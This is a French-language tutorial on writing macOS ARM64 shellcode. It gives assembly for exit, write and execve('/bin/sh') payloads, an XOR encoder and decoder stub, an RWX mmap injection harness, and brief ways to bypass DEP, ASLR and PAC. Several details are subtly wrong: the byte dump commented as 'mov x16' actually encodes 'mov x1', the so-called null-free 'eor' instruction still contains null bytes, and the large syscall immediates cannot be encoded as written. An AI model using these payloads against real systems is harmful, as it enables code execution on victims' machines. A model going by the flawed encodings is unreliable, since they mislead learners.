# Cours : Shellcode ARM64

## 1. Introduction - Qu'est-ce qu'un Shellcode ?

### 1.1 Définition Simple

Un **shellcode** est du **code machine** (bytecode) qu'un attaquant injecte dans un programme vulnérable pour prendre le contrôle du système.

**Pourquoi "shell"-code ?**

Historiquement, le but était d'ouvrir un **shell** (terminal) pour avoir un accès interactif.

```ascii
PROGRAMME VULNÉRABLE                APRÈS INJECTION

┌──────────────────┐              ┌──────────────────┐
│  Code légitime   │              │  Code légitime   │
│  ...             │              │  ...             │
│  Buffer [64]     │              │  Buffer [64]     │
│                  │              │  SHELLCODE !!    │ ← Injecté
│  return address  │              │  → /bin/sh       │ ← Écrasé
└──────────────────┘              └──────────────────┘
                                         ↓
                                  Shell lancé avec droits
                                  du programme vulnérable
```

### 1.2 Caractéristiques d'un Bon Shellcode

1. **Petit** : Généralement < 100 bytes (contraintes de buffer)
2. **Position-independent** : Fonctionne à n'importe quelle adresse mémoire (ASLR)
3. **Sans null bytes** : Éviter `\x00` (stoppe `strcpy`, `gets`, etc.)
4. **Autosuffisant** : Pas de dépendances externes

### 1.3 Défis Spécifiques macOS ARM64

Sur les Mac modernes (Apple Silicon), créer un shellcode est plus difficile :

```ascii
PROTECTIONS macOS :

┌──────────────────────────────────────────────┐
│ 1. PAC (Pointer Authentication)              │
│    → Protège les pointeurs contre corruption │
├──────────────────────────────────────────────┤
│ 2. Code Signing                              │
│    → Seul code signé peut s'exécuter         │
├──────────────────────────────────────────────┤
│ 3. ASLR (Address Space Layout Random)       │
│    → Adresses mémoire randomisées            │
├──────────────────────────────────────────────┤
│ 4. W^X (Write XOR Execute)                   │
│    → Mémoire RW ou RX, jamais RWX            │
├──────────────────────────────────────────────┤
│ 5. SIP (System Integrity Protection)         │
│    → Protection des fichiers système         │
└──────────────────────────────────────────────┘
```

## 2. Syscalls macOS ARM64

```asm
; Numéro syscall dans X16
; Arguments dans X0-X7
; SVC #0x80 pour appel

mov x16, #0x2000001    ; exit
mov x0, #0             ; code
svc #0x80
```

### Syscalls Courants

- `0x2000001` : exit
- `0x2000003` : read
- `0x2000004` : write
- `0x200003B` : execve

## 3. Shellcode Basique : exit(0)

```asm
.global _start
_start:
    mov x0, #0
    mov x16, #0x2000001
    svc #0x80
```

**Bytes** : `00 00 80 D2 21 00 80 D2 01 10 00 D4`

## 4. Shellcode : write("Hello")

```asm
_start:
    adr x1, msg
    mov x0, #1              ; stdout
    mov x2, #6              ; len
    mov x16, #0x2000004     ; write
    svc #0x80
    
    mov x0, #0
    mov x16, #0x2000001     ; exit
    svc #0x80

msg:
    .ascii "Hello\n"
```

## 5. Shellcode : execve("/bin/sh")

```asm
_start:
    adr x0, binsh
    mov x1, #0              ; argv = NULL
    mov x2, #0              ; envp = NULL
    mov x16, #0x200003B     ; execve
    svc #0x80

binsh:
    .ascii "/bin/sh\0"
```

## 6. Position-Independent Code

Le shellcode doit fonctionner à n'importe quelle adresse.

```asm
; Utiliser ADR au lieu de LDR avec adresse absolue
adr x0, data       ; PC-relative
```

## 7. Éviter les Null Bytes

Problématique pour `strcpy()`, `gets()`, etc.

```asm
; BAD : Contient null bytes
mov x0, #0         ; 00 00 80 D2

; GOOD : Sans null
eor x0, x0, x0     ; XOR X0, X0
```

## 8. Encoder le Shellcode

### XOR Encoder

```python
shellcode = b"\x00\x00\x80\xD2..."
key = 0xAA

encoded = bytes([b ^ key for b in shellcode])
```

### Stub Decoder

```asm
decoder:
    adr x1, encoded_shellcode
    mov x2, #length
    mov w3, #0xAA          ; key

decode_loop:
    ldrb w4, [x1]
    eor w4, w4, w3
    strb w4, [x1], #1
    subs x2, x2, #1
    b.ne decode_loop
    
    adr x0, encoded_shellcode
    blr x0                 ; Execute
```

## 9. Injection dans Processus

### Via mmap + Memcpy

```c
void *mem = mmap(NULL, shellcode_len,
                 PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

memcpy(mem, shellcode, shellcode_len);

void (*func)() = (void(*)())mem;
func();
```

### Via ROP Chain

Utiliser gadgets pour construire appel syscall.

## 10. Bypass Protections

### DEP (Data Execution Prevention)

- Utiliser ROP pour `mprotect()`
- JIT spray
- Réutiliser pages exécutables

### ASLR

- Leak d'adresse
- Brute force (limité)
- Gadgets position-independent

### PAC

- Utiliser gadgets sans PAC
- Leak PAC
- Brute force 16 bits

## 11. Shellcode Generator

```python
#!/usr/bin/env python3

def generate_exit_shellcode():
    shellcode = bytearray([
        0x00, 0x00, 0x80, 0xD2,  # mov x0, #0
        0x21, 0x00, 0x80, 0xD2,  # mov x16, #1
        0x01, 0x10, 0x00, 0xD4   # svc #0x80
    ])
    return bytes(shellcode)

print(generate_exit_shellcode().hex())
```

## 12. Tester Shellcode

```c
unsigned char shellcode[] = 
    "\x00\x00\x80\xD2"
    "\x21\x00\x80\xD2"
    "\x01\x10\x00\xD4";

void *mem = mmap(NULL, sizeof(shellcode),
                 PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

memcpy(mem, shellcode, sizeof(shellcode));
((void(*)())mem)();
```

## Ressources

- [ARM64 Syscall Table](https://opensource.apple.com/source/xnu/)
- [Shellcoding Tutorial](https://azeria-labs.com/writing-arm-shellcode/)

